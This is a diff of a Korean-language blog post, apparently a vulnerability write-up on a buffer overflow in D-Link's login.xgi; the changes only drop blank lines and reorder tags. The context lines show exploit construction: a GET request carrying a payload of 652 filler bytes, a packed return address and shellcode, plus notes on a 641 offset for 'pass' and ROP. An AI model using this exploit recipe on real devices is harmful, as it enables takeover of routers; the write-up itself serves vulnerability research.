@@ -248,7 +248,6 @@
 <p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB85C;&#xADF8;&#xC778;&#xC744; &#xB2F4;&#xB2F9;&#xD558;&#xB294; <code>login.xgi</code>&#xC5D0;&#xC11C; <code>user</code>&#xC640; <code>pass</code> &#xC778;&#xC790;&#xB97C; &#xD1B5;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs routeros"><span class="hljs-builtin-name">GET</span> /login.xgi?<span class="hljs-attribute">user</span>=<span class="hljs-string">&quot; + payload + &quot;</span>&amp;pass=abcde HTTP/1.1\\nHost: <span class="hljs-string">&quot; +</span>
 <span class="hljs-string">host + &quot;</span>\\n\\n<span class="hljs-string">&quot;</span></code></pre>
-
 <p><code>user</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xAD6C;&#xC131;&#xB418;&#xB294; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs apache"><span class="hljs-attribute">OFFSET</span> = <span class="hljs-number">652</span>
 <span class="hljs-attribute">ADDR</span> = <span class="hljs-number">0</span>x<span class="hljs-number">7</span>ffe<span class="hljs-number">8</span>ab<span class="hljs-number">0</span>
@@ -256,7 +255,6 @@
 <span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;A&quot;</span>*OFFSET
 <span class="hljs-attribute">payload</span> += pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, ADDR)
 <span class="hljs-attribute">payload</span> += shellcode</code></pre>
-
 <p>&#xBC18;&#xBA74;&#xC5D0; <code>pass</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB294; &#xC624;&#xD504;&#xC14B;&#xC73C;&#xB85C; 641&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; GET request&#xC5D0;&#xC11C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC5B4;&#xC57C; &#xD558;&#xBA70; ROP&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; &#xC8FC;&#xC18C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; exploit&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
 
             </div>
@@ -275,11 +273,11 @@
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
+                  <a class="hover-with-bg" href="/tags/insu/">insu</a>
+                  
                   <a class="hover-with-bg" href="/tags/cve/">cve</a>
                   
                   <a class="hover-with-bg" href="/tags/bof/">bof</a>
-                  
-                  <a class="hover-with-bg" href="/tags/insu/">insu</a>
                   
                   <a class="hover-with-bg" href="/tags/d-link/">d-link</a>
                   
